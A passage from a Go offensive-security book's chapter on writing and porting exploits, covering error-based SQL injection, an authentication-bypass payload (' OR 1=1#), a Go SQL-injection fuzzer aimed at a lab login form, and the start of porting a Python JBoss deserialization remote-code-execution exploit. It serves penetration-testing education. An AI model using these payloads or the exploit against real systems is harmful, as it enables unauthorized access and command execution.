commands after authentication. Specifically, you could update the tool to 
fuzz the CWD/CD command. Various tools have historically been susceptible 
前沿信安资讯阵地  公众号：i nf osrc
192   Chapter 9
to buffer overflows related to the handling of this command, making it a 
good target for fuzzing.
SQL Injection Fuzzing
In this section, you’ll explore SQL injection fuzzing. Instead of changing   
the length of each input, this variation on the attack cycles through a 
defined list of inputs to attempt to cause SQL injection. In other words, 
you’ll fuzz the username parameter of a website login form by attempting 
a list of inputs consisting of various SQL meta-characters and syntax that, 
if handled insecurely by the backend database, will yield abnormal behavior 
by the application.
To keep things simple, you’ll be probing only for error-based SQL injec-
tion, ignoring other forms, such as boolean-, time-, and union-based. That 
means that instead of looking for subtle differences in response content or 
response time, you’ll look for an error message in the HTTP response to 
indicate a SQL injection. This implies that you expect the web server to 
remain operational, so you can no longer rely on connection establish-
ment as a litmus test for whether you’ve succeeded in creating abnormal 
behavior. Instead, you’ll need to search the response body for a database 
error message.
How SQL Injection Works
At its core, SQL injection allows an attacker to insert SQL meta-characters 
into a statement, potentially manipulating the query to produce unintended 
behavior or return restricted, sensitive data. The problem occurs when 
developers blindly concatenate untrusted user data to their SQL queries, 
as in the following pseudocode:
username = HTTP_GET["username"]
query = "SELECT * FROM users WHERE user = '" + username + "'"
result = db.execute(query)
if(len(result) > 0) {
    return AuthenticationSuccess()
} else {
    return AuthenticationFailed()
}
In our pseudocode, the username variable is read directly from an 
HTTP parameter. The value of the username variable isn’t sanitized or 
validated. You then build a query string by using the value, concatenating 
it onto the SQL query syntax directly. The program executes the query 
against the database and inspects the result. If it finds at least one match-
ing record, you’d consider the authentication successful. The code should 
behave appropriately so long as the supplied username consists of alpha-
numeric and a certain subset of special characters. For example, supplying 
a username of alice results in the following safe query:
SELECT * FROM users WHERE user = 'alice'
前沿信安资讯阵地  公众号：i nf osrc
Writing and Porting Exploit Code   193
However, what happens when the user supplies a username containing an 
apostrophe? Supplying a username of o'doyle produces the following query:
SELECT * FROM users WHERE user = 'o'doyle'
The problem here is that the backend database now sees an unbalanced 
number of single quotation marks. Notice the emphasized portion of the 
preceding query, doyle; the backend database interprets this as SQL syntax, 
since it’s outside the enclosing quotes. This, of course, is invalid SQL syn-
tax, and the backend database won’t be able to process it. For error-based 
SQL injection, this produces an error message in the HTTP response. The 
message itself will vary based on the database. In the case of MySQL, you’ll 
receive an error similar to the following, possibly with additional details dis-
closing the query itself:
You have an error in your SQL syntax
Although we won’t go too deeply into exploitation, you could now 
manipulate the username input to produce a valid SQL query that would 
bypass the authentication in our example. The username input ' OR 1=1# 
does just that when placed in the following SQL statement:
SELECT * FROM users WHERE user = '' OR 1=1#'
This input appends a logical OR onto the end of the query. This OR state-
ment always evaluates to true, because 1 always equals 1. You then use a 
MySQL comment (#) to force the backend database to ignore the remain-
der of the query. This results in a valid SQL statement that, assuming one 
or more rows exist in the database, you can use to bypass authentication in 
the preceding pseudocode example.
Building the SQL Injection Fuzzer
The intent of your fuzzer won’t be to generate a syntactically valid SQL 
statement. Quite the opposite. You’ll want to break the query such that 
the malformed syntax yields an error by the backend database, as the 
O’Doyle example just demonstrated. For this, you’ll send various SQL 
meta-characters as input.
The first order of business is to analyze the target request. By inspecting 
the HTML source code, using an intercepting proxy, or capturing network 
packets with Wireshark, you determine that the HTTP request submitted for 
the login portal resembles the following:
POST /WebApplication/login.jsp HTTP/1.1
Host: 10.0.1.20:8080
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:54.0) Gecko/20100101 Firefox/54.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
前沿信安资讯阵地  公众号：i nf osrc
194   Chapter 9
Content-Length: 35
Referer: http://10.0.1.20:8080/WebApplication/
Cookie: JSESSIONID=2D55A87C06A11AAE732A601FCB9DE571
Connection: keep-alive
Upgrade-Insecure-Requests: 1
username=someuser&password=somepass
The login form sends a POST request to http://10.0.1.20:8080 
/WebApplication/login.jsp. There are two form parameters: username and 
password. For this example, we’ll limit the fuzzing to the username field for 
brevity. The code itself is fairly compact, consisting of a few loops, some 
regular expressions, and the creation of an HTTP request. It’s shown in 
Listing 9-2.
func main() {
    u payloads := []string{
        "baseline",
        ")",
        "(",
        "\"",
        "'",
    }   
    v sqlErrors := []string{
        "SQL",
        "MySQL",
        "ORA-",
        "syntax",
    }   
    errRegexes := []*regexp.Regexp{}
    for _, e := range sqlErrors {
        w re := regexp.MustCompile(fmt.Sprintf(".*%s.*", e)) 
        errRegexes = append(errRegexes, re) 
    }   
    x for _, payload := range payloads {
        client := new(http.Client)
        y body := []byte(fmt.Sprintf("username=%s&password=p", payload))
        z req, err := http.NewRequest(
            "POST",
            "http://10.0.1.20:8080/WebApplication/login.jsp",
            bytes.NewReader(body),
        )   
        if err != nil {
            log.Fatalf("[!] Unable to generate request: %s\n", err)
        }   
        req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
        resp, err := client.Do(req)
        if err != nil {
            log.Fatalf("[!] Unable to process response: %s\n", err)
        }   
前沿信安资讯阵地  公众号：i nf osrc
Writing and Porting Exploit Code   195
        { body, err = ioutil.ReadAll(resp.Body)
        if err != nil {
            log.Fatalf("[!] Unable to read response body: %s\n", err)
        }   
        resp.Body.Close()
        | for idx, re := range errRegexes {
            } if re.MatchString(string(body)) {
                fmt.Printf(
                    "[+] SQL Error found ('%s') for payload: %s\n",
                    sqlErrors[idx],
                    payload,
                )
                break
            }   
        }   
    }   
}
Listing 9-2: A SQL injection fuzzer (/ch-9/http_fuzz /main.go)
The code begins by defining a slice of payloads you want to attempt u. 
This is your fuzzing list that you’ll supply later as the value of the username 
request parameter. In the same vein, you define a slice of strings that repre-
sent keywords within an SQL error message v. These will be the values you’ll 
search for in the HTTP response body. The presence of any of these values is 
a strong indicator that an SQL error message is present. You could expand on 
both of these lists, but they’re adequate datasets for this example.
Next, you perform some preprocessing work. For each of the error key-
words you wish to search for, you build and compile a regular expression w. 
You do this work outside your main HTTP logic so you don’t have to create 
and compile these regular expressions multiple times, once for each payload. 
A minor optimization, no doubt, but good practice nonetheless. You’ll use 
these compiled regular expressions to populate a separate slice for use later.
Next comes the core logic of the fuzzer. You loop through each of the 
payloads x, using each to build an appropriate HTTP request body whose 
username value is your current payload y. You use the resulting value to 
build an HTTP POST request z, targeting your login form. You then set 
the Content-Type header and send the request by calling client.Do(req). 
Notice that you send the request by using the long-form process of 
creating a client and an individual request and then calling client.Do(). You 
certainly could have used Go’s http.PostForm() function to achieve the same 
behavior more concisely. However, the more verbose technique gives you 
more granular control over HTTP header values. Although in this example 
you’re setting only the Content-Type header, it’s not uncommon to set addi-
tional header values when making HTTP requests (such as User-Agent, Cookie, 
and others). You can’t do this with http.PostForm(), so going the long route 
will make it easier to add any necessary HTTP headers in the future, par-
ticularly if you’re ever interested in fuzzing the headers themselves.
前沿信安资讯阵地  公众号：i nf osrc
196   Chapter 9
Next, you read the HTTP response body by using ioutil.ReadAll() {. 
Now that you have the body, you loop through all of your precompiled 
regular expressions |, testing the response body for the presence of your 
SQL error keywords }. If you get a match, you probably have a SQL injec-
tion error message. The program will log details of the payload and error 
to the screen and move onto the next iteration of the loop.
Run your code to confirm that it successfully identifies a SQL injection 
flaw in a vulnerable login form. If you supply the username value with a single 
quotation mark, you’ll get the error indicator SQL, as shown here: 
$ go run main.go 
[+] SQL Error found ('SQL') for payload: '
We encourage you to try the following exercises to help you better 
understand the code, appreciate the nuances of HTTP communications, 
and improve your ability to detect SQL injection:
1. Update the code to test for time-based SQL injection. To do this, you’ll 
have to send various payloads that introduce a time delay when the 
backend query executes. You’ll need to measure the round-trip time 
and compare it against a baseline request to deduce whether SQL 
injection is present.
2. Update the code to test for boolean-based blind SQL injection. Although 
you can use different indicators for this, a simple way is to compare the 
HTTP response code against a baseline response. A deviation from the 
baseline response code, particularly receiving a response code of 500 
(internal server error), may be indicative of SQL injection.
3. Rather than relying on Go’s net.http package to facilitate communica-
tions, try using the net package to dial a raw TCP connection. When 
using the net package, you’ll need to be aware of the Content-Length 
HTTP header, which represents the length of the message body. You’ll 
need to calculate this length correctly for each request because the 
body length may change. If you use an invalid length value, the server 
will likely reject the request.
In the next section, we’ll show you how to port exploits to Go from 
other languages, such as Python or C.
Porting Exploits to Go
For various reasons, you may want to port an existing exploit to Go. Perhaps 
the existing exploit code is broken, incomplete, or incompatible with the 
system or version you wish to target. Although you could certainly extend or 
update the broken or incomplete code using the same language with which 
it was created, Go gives you the luxury of easy cross-compilation, consistent 
syntax and indentation rules, and a powerful standard library. All of this 
will make your exploit code arguably more portable and readable without 
compromising on features. 
前沿信安资讯阵地  公众号：i nf osrc
Writing and Porting Exploit Code   197
Likely the most challenging task when porting an existing exploit is 
determining the equivalent Go libraries and function calls to achieve the 
same level of functionality. For example, addressing endianness, encoding, 
and encryption equivalents may take a bit of research, particularly for those 
who aren’t well versed in Go. Fortunately, we’ve addressed the complexity of 
network-based communications in previous chapters. The implementations 
and nuances of this should, hopefully, be familiar.
You’ll find countless ways to use Go’s standard packages for exploit 
development or porting. While it’s unrealistic for us to comprehensively 
cover these packages and use cases in a single chapter, we encourage you 
to explore Go’s official documentation at https://golang.org/pkg/. The docu-
mentation is extensive, with an abundance of good examples to help you 
understand function and package usage. Here are just a few of the packages 
that will likely be of greatest interest to you when working with exploitation:
bytes Provides low-level byte manipulation
crypto Implements various symmetric and asymmetric ciphers and 
message authentication
debug Inspects various file type metadata and contents
encoding Encodes and decodes data by using various common forms 
such as binary, Hex, Base64, and more
io and bufio Reads and writes data from and to various common 
interface types including the file system, standard output, network 
connections, and more
net Facilitates client-server interaction by using various protocols 
such as HTTP and SMTP
os Executes and interacts with the local operating system
syscall Exposes an interface for making low-level system calls
unicode Encodes and decodes data by using UTF-16 or UTF-8
unsafe Useful for avoiding Go’s type safety checks when interacting 
with the operating system
Admittedly, some of these packages will prove to be more useful in later 
chapters, particularly when we discuss low-level Windows interactions, but 
we’ve included this list for your awareness. Rather than trying to cover these 
packages in detail, we’ll show you how to port an existing exploit by using 
some of these packages.
Porting an Exploit from Python
In this first example, you’ll port an exploit of the Java deserialization vul-
nerability released in 2015. The vulnerability, categorized under several 
CVEs, affects the deserialization of Java objects in common applications, 
servers, and libraries.1 This vulnerability is introduced by a deserialization 
1. For more detailed information about this vulnerability, refer to https://foxglovesecurity.com 
 /2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in 
-common-this-vulnerability/#jboss.
前沿信安资讯阵地  公众号：i nf osrc
198   Chapter 9
library that doesn’t validate input prior to server-side execution (a com-
mon cause of vulnerabilities). We’ll narrow our focus to exploiting JBoss, 
a popular Java Enterprise Edition application server. At https://github.com 
/roo7break/serialator/blob/master/serialator.py, you’ll find a Python script 
that contains logic to exploit the vulnerability in multiple applications. 
Listing 9-3 provides the logic you’ll replicate. 
def jboss_attack(HOST, PORT, SSL_On, _cmd):
    # The below code is based on the jboss_java_serialize.nasl script within Nessus 
    """
    This function sets up the attack payload for JBoss
    """
    body_serObj = hex2raw3("ACED000573720032737--SNIPPED FOR BREVITY--017400") u
    cleng = len(_cmd)
    body_serObj += chr(cleng) + _cmd v
    body_serObj += hex2raw3("740004657865637571--SNIPPED FOR BREVITY--7E003A") w
    if SSL_On: x
        webservice = httplib2.Http(disable_ssl_certificate_validation=True)
        URL_ADDR = "%s://%s:%s" % ('https',HOST,PORT)
    else:
        webservice = httplib2.Http()
        URL_ADDR = "%s://%s:%s" % ('http',HOST,PORT)
    headers = {"User-Agent":"JBoss_RCE_POC", y
            "Content-type":"application/x-java-serialized-object--SNIPPED FOR BREVITY--",
            "Content-length":"%d" % len(body_serObj)
        }
    resp, content = webservice.requestz (
        URL_ADDR+"/invoker/JMXInvokerServlet",
        "POST",
        body=body_serObj,
        headers=headers)
    # print provided response.
    print("[i] Response received from target: %s" % resp)
Listing 9-3: The Python serialization exploit code
Let’s take a look at what you’re working with here. The function receives 
a host, port, SSL indicator, and operating system command as parameters. 
To build the proper request, the function has to create a payload that rep-
resents a serialized Java object. This script starts by hardcoding a series of 
bytes onto a variable named body_serObj u. These bytes have been snipped for 
brevity, but notice they are represented in the code as a string value. This is 
a hexadecimal string, which you’ll need to convert to a byte array so that two 
characters of the string become a single byte representation. For example, 
you’ll need to convert AC to the hexadecimal byte \xAC. To accomplish this 
conversion, the exploit code calls a function named hex2raw3. Details of this 
function’s underlying implementation are inconsequential, so long as you 
understand what’s happening to the hexadecimal string.
前沿信安资讯阵地  公众号：i nf osrc
Writing and Porting Exploit Code   199
Next, the script calculates the length of the operating system command, 